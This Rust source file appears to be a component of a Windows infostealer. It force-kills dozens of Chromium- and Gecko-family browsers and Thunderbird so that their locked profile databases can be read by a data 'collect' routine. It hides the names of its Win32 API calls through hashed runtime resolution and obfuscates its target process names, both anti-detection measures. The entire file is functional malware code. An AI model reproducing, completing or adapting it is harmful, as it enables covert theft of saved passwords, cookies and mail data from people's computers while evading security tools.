//! Browser process termination so locked profile databases become readable.
//!
//! Enumerates processes with the Toolhelp32 snapshot API and terminates exact
//! exe-name matches from a fixed kill list (no heuristics, no partial matches).
//! All Win32 calls go through hashed runtime resolution like the rest of the
//! crate.

use std::ffi::c_void;
use std::sync::atomic::{AtomicBool, Ordering};

use crate::resolve::resolve;

/// Termination is a last resort (locked DBs) and happens at most once per
/// collect run (reset by lib.rs::try_collect); the quiet read tiers in
/// fsutil handle running browsers.
static KILL_ATTEMPTED: AtomicBool = AtomicBool::new(false);

/// Re-arm the once-per-run kill budget; called at the start of every
/// collect run.
pub fn reset_kill_state() {
    KILL_ATTEMPTED.store(false, Ordering::SeqCst);
}

const TH32CS_SNAPPROCESS: u32 = 0x2;
const PROCESS_TERMINATE: u32 = 0x1;
const INVALID_HANDLE: isize = -1;
const MAX_PATH_W: usize = 260;

/// Exact exe names (compared case-insensitively), obfuscated at rest. This
/// list is the safety boundary: anything not on it is never touched.
fn kill_list() -> Vec<String> {
    vec![
        // Chromium family
        crate::obf!("chrome.exe"),
        crate::obf!("chromium.exe"),
        crate::obf!("msedge.exe"),
        crate::obf!("brave.exe"),
        crate::obf!("opera.exe"),
        crate::obf!("operagx.exe"),
        crate::obf!("neon.exe"),
        crate::obf!("vivaldi.exe"),
        crate::obf!("whale.exe"),
        crate::obf!("yandex.exe"),
        crate::obf!("browser.exe"),
        crate::obf!("torch.exe"),
        crate::obf!("iridium.exe"),
        crate::obf!("blisk.exe"),
        crate::obf!("kinza.exe"),
        crate::obf!("sidekick.exe"),
        crate::obf!("slimjet.exe"),
        crate::obf!("cryptotab.exe"),
        crate::obf!("coccoc.exe"),
        crate::obf!("dragon.exe"),
        crate::obf!("epic.exe"),
        crate::obf!("cent.exe"),
        crate::obf!("maxthon.exe"),
        crate::obf!("sleipnir.exe"),
        crate::obf!("orbitum.exe"),
        crate::obf!("citrio.exe"),
        crate::obf!("sputnik.exe"),
        crate::obf!("iron.exe"),
        crate::obf!("amigo.exe"),
        crate::obf!("chedot.exe"),
        crate::obf!("spark.exe"),
        crate::obf!("liebao.exe"),
        crate::obf!("coowon.exe"),
        crate::obf!("360se.exe"),
        crate::obf!("360chrome.exe"),
        crate::obf!("coolnovo.exe"),
        crate::obf!("swing.exe"),
        crate::obf!("xvast.exe"),
        crate::obf!("xpom.exe"),
        crate::obf!("7star.exe"),
        crate::obf!("titan.exe"),
        crate::obf!("kometa.exe"),
        crate::obf!("twinkstar.exe"),
        crate::obf!("insomniac.exe"),
        crate::obf!("torbro.exe"),
        crate::obf!("qip.exe"),
        crate::obf!("blackhawk.exe"),
        // Gecko family
        crate::obf!("firefox.exe"),
        crate::obf!("waterfox.exe"),
        crate::obf!("palemoon.exe"),
        crate::obf!("basilisk.exe"),
        crate::obf!("seamonkey.exe"),
        crate::obf!("cyberfox.exe"),
        crate::obf!("icedragon.exe"),
        crate::obf!("k-meleon.exe"),
        crate::obf!("falkon.exe"),
        // Mail
        crate::obf!("thunderbird.exe"),
    ]
}

#[repr(C)]
struct ProcessEntry32W {
    dw_size: u32,
    cnt_usage: u32,
    th32_process_id: u32,
    th32_default_heap_id: usize,
    th32_module_id: u32,
    cnt_threads: u32,
    th32_parent_process_id: u32,
    pc_pri_class_base: i32,
    dw_flags: u32,
    sz_exe_file: [u16; MAX_PATH_W],
}

impl ProcessEntry32W {
    fn new() -> Self {
        let mut e: ProcessEntry32W = unsafe { std::mem::zeroed() };
        e.dw_size = std::mem::size_of::<ProcessEntry32W>() as u32;
        e
    }

    fn exe_name(&self) -> String {
        let len = self
            .sz_exe_file
            .iter()
            .position(|&c| c == 0)
            .unwrap_or(MAX_PATH_W);
        String::from_utf16_lossy(&self.sz_exe_file[..len]).to_lowercase()
    }
}

type CreateToolhelp32SnapshotFn = unsafe extern "system" fn(u32, u32) -> *mut c_void;
type Process32FirstWFn = unsafe extern "system" fn(*mut c_void, *mut ProcessEntry32W) -> i32;
type Process32NextWFn = unsafe extern "system" fn(*mut c_void, *mut ProcessEntry32W) -> i32;
type OpenProcessFn = unsafe extern "system" fn(u32, i32, u32) -> *mut c_void;
type TerminateProcessFn = unsafe extern "system" fn(*mut c_void, u32) -> i32;
type CloseHandleFn = unsafe extern "system" fn(*mut c_void) -> i32;
type GetCurrentProcessIdFn = unsafe extern "system" fn() -> u32;

struct Api {
    snapshot: CreateToolhelp32SnapshotFn,
    first: Process32FirstWFn,
    next: Process32NextWFn,
    open: OpenProcessFn,
    terminate: TerminateProcessFn,
    close: CloseHandleFn,
    current_pid: GetCurrentProcessIdFn,
}

fn load_api() -> Option<Api> {
    unsafe {
        let addrs = [
            resolve("kernel32.dll", crate::api!("CreateToolhelp32Snapshot")),
            resolve("kernel32.dll", crate::api!("Process32FirstW")),
            resolve("kernel32.dll", crate::api!("Process32NextW")),
            resolve("kernel32.dll", crate::api!("OpenProcess")),
            resolve("kernel32.dll", crate::api!("TerminateProcess")),
            resolve("kernel32.dll", crate::api!("CloseHandle")),
            resolve("kernel32.dll", crate::api!("GetCurrentProcessId")),
        ];
        if addrs.iter().any(|&a| a == 0) {
            return None;
        }
        Some(Api {
            snapshot: std::mem::transmute(addrs[0]),
            first: std::mem::transmute(addrs[1]),
            next: std::mem::transmute(addrs[2]),
            open: std::mem::transmute(addrs[3]),
            terminate: std::mem::transmute(addrs[4]),
            close: std::mem::transmute(addrs[5]),
            current_pid: std::mem::transmute(addrs[6]),
        })
    }
}

/// Iterate all processes, calling `f(pid, exe_name_lowercase)` for each.
fn for_each_process(api: &Api, mut f: impl FnMut(u32, &str)) {
    unsafe {
        let snap = (api.snapshot)(TH32CS_SNAPPROCESS, 0);
        if snap.is_null() || snap as isize == INVALID_HANDLE {
            return;
        }
        let mut entry = ProcessEntry32W::new();
        if (api.first)(snap, &mut entry) != 0 {
            loop {
                f(entry.th32_process_id, &entry.exe_name());
                if (api.next)(snap, &mut entry) == 0 {
                    break;
                }
            }
        }
        (api.close)(snap);
    }
}

fn terminate(api: &Api, pid: u32) -> bool {
    unsafe {
        let handle = (api.open)(PROCESS_TERMINATE, 0, pid);
        if handle.is_null() {
            return false;
        }
        let ok = (api.terminate)(handle, 0) != 0;
        (api.close)(handle);
        ok
    }
}

/// Like `terminate_browsers`, but fires at most once per process lifetime.
/// Returns 0 if the kill was already spent on an earlier browser.
pub fn terminate_browsers_once() -> usize {
    if KILL_ATTEMPTED
        .compare_exchange(false, true, Ordering::SeqCst, Ordering::SeqCst)
        .is_err()
    {
        return 0;
    }
    terminate_browsers()
}

/// Terminate every running process whose exe name is on the kill list
/// (never our own PID), then poll up to ~5s for the processes to exit so
/// file locks are released before collection. Returns the number terminated.
pub fn terminate_browsers() -> usize {
    let Some(api) = load_api() else {
        return 0;
    };
    let own_pid = unsafe { (api.current_pid)() };
    let kill_list = kill_list();

    let mut killed = 0usize;
    for_each_process(&api, |pid, name| {
        if pid != own_pid && kill_list.iter().any(|k| k == name) && terminate(&api, pid) {
            killed += 1;
        }
    });
    if killed == 0 {
        return 0;
    }

    // Wait for the killed processes to actually exit and release handles.
    for _ in 0..25 {
        let mut alive = false;
        for_each_process(&api, |pid, name| {
            if pid != own_pid && kill_list.iter().any(|k| k == name) {
                alive = true;
            }
        });
        if !alive {
            break;
        }
        std::thread::sleep(std::time::Duration::from_millis(200));
    }
    killed
}
